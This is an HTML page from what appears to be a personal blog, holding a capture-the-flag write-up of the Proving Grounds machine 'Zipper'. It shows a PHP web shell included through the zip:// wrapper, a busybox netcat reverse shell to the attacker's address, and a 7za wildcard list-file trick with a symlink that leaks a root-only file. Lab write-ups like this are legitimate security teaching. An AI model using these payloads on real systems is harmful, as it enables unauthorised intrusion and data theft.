@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html id="R-html" lang="en-us" dir="ltr" itemscope itemtype="http://schema.org/Article" data-r-output-format="html">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
+    <meta name="generator" content="Hugo 0.154.5">
+    <meta name="generator" content="Relearn 9.0.3+36307e4ed23582638ab689240ac7b427217803ee">
+    <meta name="description" content="Zipper writeup - Linux exploitation walkthrough covering PHP zip wrapper abuse for initial access and privilege escalation through a vulnerable 7za backup cron job.">
+    <meta name="author" content="">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Zipper :: Zenu">
+    <meta name="twitter:description" content="Zipper writeup - Linux exploitation walkthrough covering PHP zip wrapper abuse for initial access and privilege escalation through a vulnerable 7za backup cron job.">
+    <meta property="og:url" content="http://localhost:1313/writeup/proving-grounds/zipper/index.html">
+    <meta property="og:site_name" content="Zenu">
+    <meta property="og:title" content="Zipper :: Zenu">
+    <meta property="og:description" content="Zipper writeup - Linux exploitation walkthrough covering PHP zip wrapper abuse for initial access and privilege escalation through a vulnerable 7za backup cron job.">
+    <meta property="og:locale" content="en_us">
+    <meta property="og:type" content="article">
+    <meta property="article:section" content="Writeup">
+    <meta property="article:published_time" content="2026-04-30T10:12:33+09:00">
+    <meta property="article:modified_time" content="2026-04-30T10:12:33+09:00">
+    <meta property="article:tag" content="Zip">
+    <meta property="article:tag" content="7za">
+    <meta property="article:tag" content="7z">
+    <meta property="article:tag" content="Php-Wrapper">
+    <meta itemprop="name" content="Zipper :: Zenu">
+    <meta itemprop="description" content="Zipper writeup - Linux exploitation walkthrough covering PHP zip wrapper abuse for initial access and privilege escalation through a vulnerable 7za backup cron job.">
+    <meta itemprop="datePublished" content="2026-04-30T10:12:33+09:00">
+    <meta itemprop="dateModified" content="2026-04-30T10:12:33+09:00">
+    <meta itemprop="wordCount" content="484">
+    <meta itemprop="keywords" content="Zip,7za,7z,Php-Wrapper">
+    <title>Zipper :: Zenu</title>
+    <link href="/images/favicon.png?1778379068" rel="icon" type="image/png">
+    <link href="/css/auto-complete/auto-complete.min.css?1778379068" rel="stylesheet">
+    <script src="/js/auto-complete/auto-complete.min.js?1778379068" defer></script>
+    <script src="/js/search-lunr.js?1778379068" defer></script>
+    <script src="/js/search.js?1778379068" defer></script>
+    <script>
+      window.relearn = window.relearn || {};
+      window.relearn.index_js_url="/searchindex.en.js?1778379068";
+    </script>
+    <script src="/js/lunr/lunr.min.js?1778379068" defer></script>
+    <script src="/js/lunr/lunr.stemmer.support.min.js?1778379068" defer></script>
+    <script src="/js/lunr/lunr.multi.min.js?1778379068" defer></script>
+    <script src="/js/lunr/lunr.en.min.js?1778379068" defer></script>
+    <script>
+      window.relearn = window.relearn || {};
+      window.relearn.contentLangs=['en'];
+    </script>
+    <link href="/fonts/fontawesome/css/all.min.css?1778379068" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/all.min.css?1778379068" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1778379068" rel="stylesheet">
+    <link href="/css/theme.css?1778379068" rel="stylesheet">
+    <link href="/css/format-html.css?1778379068" rel="stylesheet" id="R-format-style">
+    <script>
+      window.relearn = window.relearn || {};
+      // configuration
+      window.relearn.min = ``;
+      window.relearn.path='\/writeup\/proving-grounds\/zipper\/index.html';
+      window.relearn.relBasePath='..\/..\/..';
+      window.relearn.relBaseUri='..\/..\/..';
+      window.relearn.absBaseUri='http:\/\/localhost:1313';
+      window.relearn.disableInlineCopyToClipboard=false;
+      window.relearn.enableBlockCodeWrap=true;
+      // translations
+      window.T_Copy_to_clipboard = `Copy text to clipboard`;
+      window.T_Copied_to_clipboard = `Text copied to clipboard!`;
+      window.T_Link_copied_to_clipboard = `Link copied to clipboard!`;
+      window.T_Reset_view = `Reset view`;
+      window.T_View_reset = `View reset!`;
+      window.T_No_results_found = `No results found for "{0}"`;
+      window.T_N_results_found = `{1} results found for "{0}"`;
+      window.T_Browser_unsupported_feature = `This browser doesn't support this feature`;
+      // variant stuff
+      window.relearn.themevariants = [ 'relearn-light', 'relearn-dark', 'neon', 'zen-dark', 'zen-light' ];
+      window.relearn.customvariantprefix = "my-custom-";
+      window.relearn.changeVariant = function(variant) {
+        var oldVariant = document.documentElement.dataset.rThemeVariant;
+        window.localStorage.setItem(window.relearn.absBaseUri + "/variant", variant);
+        document.documentElement.dataset.rThemeVariant = variant;
+        if (oldVariant != variant) {
+          document.dispatchEvent( new CustomEvent('themeVariantLoaded', { detail: { variant, oldVariant } }) );
+          window.relearn.markVariant();
+        }
+      }
+      window.relearn.markVariant = function() {
+        var variant = window.localStorage.getItem(window.relearn.absBaseUri + "/variant");
+        document.querySelectorAll(".R-variantswitcher select").forEach((select) => {select.value = variant;});
+      }
+      window.relearn.initVariant = function() {
+        var variant = window.localStorage.getItem(window.relearn.absBaseUri + "/variant") ?? "";
+        if( !variant ||
+            (!variant.startsWith(window.relearn.customvariantprefix) && !window.relearn.themevariants.includes(variant)) ||
+            (variant.startsWith(window.relearn.customvariantprefix) && !window.localStorage.getItem(window.relearn.absBaseUri + "/variantstylesheet-" + variant)) ){
+          variant = window.relearn.themevariants[0];
+          window.localStorage.setItem(window.relearn.absBaseUri + "/variant", variant);
+        }
+        document.documentElement.dataset.rThemeVariant = variant;
+      }
+      window.relearn.initVariant();
+      window.relearn.markVariant();
+    </script>
+  </head>
+  <body class="mobile-support html" data-origin="/writeup/proving-grounds/zipper/index.html">
+    <div id="R-body" class="default-animation">
+      <div id="R-body-overlay"></div>
+      <nav id="R-topbar" class="default-animation">
+        <div class="topbar-wrapper default-animation">
+          <div class="topbar-sidebar-divider default-animation"></div>
+          <div class="topbar-area topbar-area-start" data-area="start">
+            <div class="topbar-button topbar-button-sidebar default-animation" data-content-empty="disable" data-width-s="show" data-width-m="hide" data-width-l="hide">
+<span class="btn cstyle button link noborder notitle interactive"><button onclick="toggleNav()" type="button" title="Menu (CTRL&#43;ALT&#43;n)"><i class="fa-fw fas fa-bars"></i></button></span>
+            </div>
+            <div class="topbar-button topbar-button-toc default-animation" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><button onclick="toggleTopbarFlyout(this)" type="button" title="Table of Contents (CTRL&#43;ALT&#43;t)"><i class="fa-fw fas fa-table-list"></i></button></span>
+              <div class="topbar-content">
+                <div class="topbar-content-wrapper">
+<nav class="TableOfContents">
+  <ul>
+    <li><a href="#web-enumeration">Web enumeration</a></li>
+  </ul>
+</nav>
+                </div>
+              </div>
+            </div>
+          </div>
+          <ol class="topbar-breadcrumbs breadcrumbs highlightable" itemscope itemtype="http://schema.org/BreadcrumbList"><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/index.html"><span itemprop="name">Home</span></a><meta itemprop="position" content="1">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/writeup/index.html"><span itemprop="name">Writeup</span></a><meta itemprop="position" content="2">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><a itemprop="item" href="/writeup/proving-grounds/index.html"><span itemprop="name">Proving Grounds</span></a><meta itemprop="position" content="3">&nbsp;>&nbsp;</li><li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement" class=""><span itemprop="name">Zipper</span><meta itemprop="position" content="4"></li>
+          </ol>
+          <div class="topbar-area topbar-area-end" data-area="end">
+            <div class="topbar-button topbar-button-prev default-animation" data-content-empty="disable" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><a href="/writeup/proving-grounds/index.html" title="Proving Grounds (🡐)"><i class="fa-fw fas fa-chevron-left"></i></a></span>
+            </div>
+            <div class="topbar-button topbar-button-next default-animation" data-content-empty="disable" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><a href="/writeup/proving-grounds/snookums/index.html" title="Snookums (🡒)"><i class="fa-fw fas fa-chevron-right"></i></a></span>
+            </div>
+            <div class="topbar-button topbar-button-more default-animation" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show">
+<span class="btn cstyle button link noborder notitle interactive"><button onclick="toggleTopbarFlyout(this)" type="button" title="More"><i class="fa-fw fas fa-ellipsis-v"></i></button></span>
+              <div class="topbar-content">
+                <div class="topbar-content-wrapper">
+                  <div class="topbar-area topbar-area-more" data-area="more">
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav>
+      <div id="R-main-overlay"></div>
+      <main id="R-body-inner" class="highlightable writeup" tabindex="-1">
+        <div class="flex-block-wrapper">
+<article class="default">
+  <header class="headline">
+<div class="R-taxonomy taxonomy-tags cstyle tags" title="Tags" style="--VARIABLE-TAGS-BG-color: var(--INTERNAL-TAG-BG-color);">
+  <i class="fa-fw fas fa-layer-group"></i>
+  <ul>
+    <li><a class="term-link" href="/tags/7z/index.html">7z</a></li>
+    <li><a class="term-link" href="/tags/7za/index.html">7za</a></li>
+    <li><a class="term-link" href="/tags/php-wrapper/index.html">Php-Wrapper</a></li>
+    <li><a class="term-link" href="/tags/zip/index.html">Zip</a></li>
+  </ul>
+</div>
+  </header>
+
+<h1 id="zipper">Zipper</h1>
+
+<h1 id="port-scan">Port scan<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-title: Zipper
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span></span></span></code></pre></div>
+<p>Only SSH and HTTP are exposed. Since the web service is the most interesting attack surface, I started there.</p>
+<h1 id="initial-foothold">Initial foothold<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
+<h2 id="web-enumeration">Web enumeration<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<p>Accessing the web page reveals a simple application with a file upload function.</p>
+<p><a href="#R-image-3c6af4ee534a5571887b15c94910aa9f" class="lightbox-link"><img alt="mainpage" class="lazy lightbox figure-image" loading="lazy" src="/images/zipper/zipper.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-3c6af4ee534a5571887b15c94910aa9f"><img alt="mainpage" class="lazy lightbox lightbox-image" loading="lazy" src="/images/zipper/zipper.png"></a></p>
+<p>After uploading a test file, I noticed that the application stores uploaded archives under the <code>uploads</code> directory with a generated filename such as <code>upload_1777450472.zip</code>.</p>
+<p>The application also accepts a <code>file</code> parameter and includes the requested file. Because the uploaded content remains inside a ZIP archive, I tested PHP&rsquo;s <code>zip://</code> stream wrapper to include a file from inside the archive.</p>
+<p>I created a small PHP web shell named <code>zipper</code>:</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div>
+<p>Then I uploaded it.</p>
+<p>The file can be reached through the ZIP wrapper by using the uploaded ZIP path and the internal filename. The <code>#</code> separator must be URL-encoded as <code>%23</code>.</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>http://192.168.166.229/index.php?file=zip://uploads/upload_1777450472.zip%23zipper&amp;cmd=id</code></pre></div>
+<p><a href="#R-image-c70182170e3a3bab5c6146df519473a4" class="lightbox-link"><img alt="zip" class="lazy lightbox figure-image" loading="lazy" src="/images/zipper/zip.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-c70182170e3a3bab5c6146df519473a4"><img alt="zip" class="lazy lightbox lightbox-image" loading="lazy" src="/images/zipper/zip.png"></a></p>
+<p>After confirming command execution, I used <code>busybox nc</code> to catch a reverse shell.</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>http://192.168.166.229/index.php?file=zip://uploads/upload_1777450472.zip%23zipper&amp;cmd=busybox%20nc%20192.168.45.156%204444%20-e%20sh</code></pre></div>
+<h1 id="privilege-escalation">Privilege escalation<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
+<p>After getting a shell as <code>www-data</code>, I transferred and ran <code>pspy</code> to look for scheduled tasks. A root-owned cron job was executing <code>/opt/backup.sh</code>.</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>2026/04/29 08:25:01 CMD: UID=0     PID=5107   | bash /opt/backup.sh 
+2026/04/29 08:25:01 CMD: UID=0     PID=5106   | /bin/sh -c    bash /opt/backup.sh </code></pre></div>
+<p>The script contains the following logic:</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span>password<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>cat /root/secret<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>cd /var/www/html/uploads
+</span></span><span style="display:flex;"><span>rm *.tmp
+</span></span><span style="display:flex;"><span>7za a /opt/backups/backup.zip -p$password -tzip *.zip &gt; /opt/backups/backup.log</span></span></code></pre></div>
+<p>The vulnerable part is the <code>*.zip</code> wildcard passed directly to <code>7za</code>. The <code>7za</code> utility supports list files through the <code>@filename</code> syntax. If a file named <code>@root.zip</code> exists in the working directory, <code>7za</code> treats <code>root.zip</code> as a list file instead of a normal archive.</p>
+<p>Since <code>/var/www/html/uploads</code> is writable by <code>www-data</code>, I created a list-file trigger and pointed <code>root.zip</code> to <code>/root/proof.txt</code>.</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>touch @root.zip
+</span></span><span style="display:flex;"><span>ln -s /root/proof.txt root.zip</span></span></code></pre></div>
+<p>When the cron job runs, the shell expands <code>*.zip</code>, and <code>7za</code> processes <code>@root.zip</code>. This causes <code>7za</code> to read the symlinked <code>/root/proof.txt</code> as a list file. Each line from the root-only file is interpreted as a path to archive.</p>
+<p>Those interpreted paths do not exist, so <code>7za</code> writes warnings to <code>/opt/backups/backup.log</code>. Because the warnings include the missing &ldquo;filenames&rdquo;, the contents of <code>/root/proof.txt</code> are leaked into the log.</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>www-data@zipper:/var/www/html/uploads$ cat /opt/backups/backup.log 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>7-Zip <span style="color:#f92672">(</span>a<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>64<span style="color:#f92672">]</span> 16.02 : Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> 1999-2016 Igor Pavlov : 2016-05-21
+</span></span><span style="display:flex;"><span>p7zip Version 16.02 <span style="color:#f92672">(</span>locale<span style="color:#f92672">=</span>en_US.UTF-8,Utf16<span style="color:#f92672">=</span>on,HugeFiles<span style="color:#f92672">=</span>on,64 bits,1 CPU AMD EPYC <span style="color:#ae81ff">7413</span> 24-Core Processor                 <span style="color:#f92672">(</span>A00F11<span style="color:#f92672">)</span>,ASM,AES-NI<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Open archive: /opt/backups/backup.zip
+</span></span><span style="display:flex;"><span>--
+</span></span><span style="display:flex;"><span>Path <span style="color:#f92672">=</span> /opt/backups/backup.zip
+</span></span><span style="display:flex;"><span>Type <span style="color:#f92672">=</span> zip
+</span></span><span style="display:flex;"><span>Physical Size <span style="color:#f92672">=</span> <span style="color:#ae81ff">2136343</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Scanning the drive:
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">21</span> files, <span style="color:#ae81ff">2133135</span> bytes <span style="color:#f92672">(</span><span style="color:#ae81ff">2084</span> KiB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Updating archive: /opt/backups/backup.zip
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Items to compress: <span style="color:#ae81ff">21</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Files read from disk: <span style="color:#ae81ff">21</span>
+</span></span><span style="display:flex;"><span>Archive size: <span style="color:#ae81ff">2136498</span> bytes <span style="color:#f92672">(</span><span style="color:#ae81ff">2087</span> KiB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Scan WARNINGS <span style="color:#66d9ef">for</span> files and folders:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>WildCardsGoingWild : No more files
+</span></span><span style="display:flex;"><span>c4c57ccc78b351703407139d38347cee : No more files</span></span></code></pre></div>
+<p>The root flag is exposed in the backup log.</p>
+
+  <footer class="footline">
+              <i class='fa-fw fas fa-calendar'></i> Apr 30, 2026
+  </footer>
+</article>
+        </div>
+      </main>
+    </div>
+    <aside id="R-sidebar" class="default-animation">
+      <div id="R-header-topbar" class="default-animation"></div>
+      <div id="R-header-wrapper" class="default-animation">
+        <a id="R-logo" class="R-default direction-row" href="/index.html">
+          <span class="logo-title default-animation">Zenu</span>
+        </a>
+        <search><form action="/search/index.html" method="get">
+          <div class="searchbox default-animation">
+            <button class="search-detail" type="submit" title="Search (CTRL+ALT+f)"><i class="fas fa-fw fa-search"></i></button>
+            <label class="a11y-only" for="R-search-by">Search</label>
+            <input data-search-input id="R-search-by" name="search-by" class="search-by" type="search" placeholder="Search...">
+            <button class="search-clear" type="button" data-search-clear="" title="Clear search"><i class="fas fa-fw fa-times" title="Clear search"></i></button>
+          </div>
+        </form></search>
+      </div>
+      <div id="R-homelinks" class="default-animation">
+        <div class="R-menu-divider default-animation">
+          <hr class="padding default-animation">
+        </div>
+        <div class="R-sidebarmenu R-shortcutmenu-homelinks default-animation">
+          <ul class="space collapsible-menu">
+          </ul>
+        </div>
+        <div class="R-menu-divider default-animation">
+          <hr class="padding default-animation">
+        </div>
+        <div class="R-sidebarmenu R-shortcutmenu-headercontrols default-animation">
+          <ul class="">
+          </ul>
+        </div>
+        <div class="R-menu-divider default-animation">
+          <hr class="padding default-animation">
+        </div>
+      </div>
+      <div id="R-content-wrapper" class="highlightable">
+        <div class="R-sidebarmenu R-shortcutmenu-main default-animation">
+          <ul class="enlarge morespace collapsible-menu">
+            <li class="" data-nav-id="/posts/index.html"><a class="padding default-animation" href="/posts/index.html"><i class="fa-solid fa-dog"></i> Posts<i class="fa-fw fas fa-check read-icon"></i></a><ul id="R-subsections-b4e55eb7e39db1aee6d02808a2267090" class="collapsible-menu"></ul></li>
+            <li class="" data-nav-id="/private/index.html"><a class="padding default-animation" href="/private/index.html"><i class="fa-solid fa-user-secret"></i>Private<i class="fa-fw fas fa-check read-icon"></i></a><ul id="R-subsections-770b76f7b7b90b1c020ff5111c7b62af" class="collapsible-menu"></ul></li>
+            <li class="parent " data-nav-id="/writeup/index.html"><a class="padding default-animation" href="/writeup/index.html"><i class="fa-solid fa-cat"></i> Writeup<i class="fa-fw fas fa-check read-icon"></i></a><ul id="R-subsections-4c552b9ca9f2e0503cd4c0d79a1b1839" class="collapsible-menu">
+            <li class="parent alwaysopen " data-nav-id="/writeup/proving-grounds/index.html"><a class="padding default-animation" href="/writeup/proving-grounds/index.html">Proving Grounds<i class="fa-fw fas fa-check read-icon"></i></a><ul id="R-subsections-5c44e917da5921333a506ba619b792ee" class="collapsible-menu">
+            <li class="active " data-nav-id="/writeup/proving-grounds/zipper/index.html"><a class="padding" href="/writeup/proving-grounds/zipper/index.html">Zipper<i class="fa-fw fas fa-check read-icon"></i></a></li>
+            <li class="" data-nav-id="/writeup/proving-grounds/snookums/index.html"><a class="padding" href="/writeup/proving-grounds/snookums/index.html">Snookums<i class="fa-fw fas fa-check read-icon"></i></a></li>
+            <li class="" data-nav-id="/writeup/proving-grounds/squid/index.html"><a class="padding" href="/writeup/proving-grounds/squid/index.html">Squid<i class="fa-fw fas fa-check read-icon"></i></a></li>
+            <li class="" data-nav-id="/writeup/proving-grounds/heist/index.html"><a class="padding" href="/writeup/proving-grounds/heist/index.html">Heist<i class="fa-fw fas fa-check read-icon"></i></a></li>
+            <li class="" data-nav-id="/writeup/proving-grounds/vault/index.html"><a class="padding" href="/writeup/proving-grounds/vault/index.html">Vault<i class="fa-fw fas fa-check read-icon"></i></a></li>
+            <li class="" data-nav-id="/writeup/proving-grounds/access/index.html"><a class="padding" href="/writeup/proving-grounds/access/index.html">Access<i class="fa-fw fas fa-check read-icon"></i></a></li>
+            <li class="" data-nav-id="/writeup/proving-grounds/nickel/index.html"><a class="padding" href="/writeup/proving-grounds/nickel/index.html">Nickel<i class="fa-fw fas fa-check read-icon"></i></a></li></ul></li></ul></li>
+          </ul>
+        </div>
+        <div class="R-sidebarmenu R-shortcutmenu-shortcuts default-animation">
+          <div class="nav-title padding">More</div>
+          <ul class="space collapsible-menu">
+            <li class="" data-nav-id="https://github.com/eoniboogie/CVE_Disclosures"><a class="padding" href="https://github.com/eoniboogie/CVE_Disclosures" rel="external"><i class="fab fa-github"></i> CVE Disclosures<i class="fa-fw fas fa-check read-icon"></i></a></li>
+          </ul>
+        </div>
+        <div id="R-footer-margin" class="default-animation"></div>
+        <div class="R-menu-divider default-animation">
+          <hr class="padding default-animation">
+        </div>
+        <div class="R-sidebarmenu R-shortcutmenu-footercontrols default-animation">
+          <ul class="">
+            <li class="R-variantswitcher">
+              <div class="padding menu-control">
+                <i class="fa-fw fas fa-paint-brush"></i>
+                <span>&nbsp;</span>
+                <div class="control-style">
+                  <label class="a11y-only" for="R-select-variant">Theme</label>
+                  <select id="R-select-variant">
+                    <option id="R-select-variant-relearn-light" value="relearn-light" selected>Relearn Light</option>
+                    <option id="R-select-variant-relearn-dark" value="relearn-dark">Relearn Dark</option>
+                    <option id="R-select-variant-neon" value="neon">Neon</option>
+                    <option id="R-select-variant-zen-dark" value="zen-dark">Zen Dark</option>
+                    <option id="R-select-variant-zen-light" value="zen-light">Zen Light</option>
+                  </select>
+                </div>
+                <div class="clear"></div>
+              </div>
+              <script>window.relearn.markVariant();</script>
+            </li>
+            <li class="R-historyclearer">
+              <div class="padding menu-control">
+                <i class="fa-fw fas fa-history"></i>
+                <span>&nbsp;</span>
+                <div class="control-style">
+                  <button>Clear History</button>
+                </div>
+                <div class="clear"></div>
+              </div>
+            </li>
+          </ul>
+        </div>
+<div id="R-footer" class="default-animation"><p>Built with <a href="https://github.com/McShelby/hugo-theme-relearn" title="love"><i class="fas fa-heart"></i></a> by <a href="https://gohugo.io/">Hugo</a></p></div>
+      </div>
+    </aside>
+    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1778379068" defer></script>
+    <script src="/js/theme.js?1778379068" defer></script>
+    <div id="toast-container" role="status" aria-live="polite" aria-atomic="false"></div>
+  </body>
+</html>
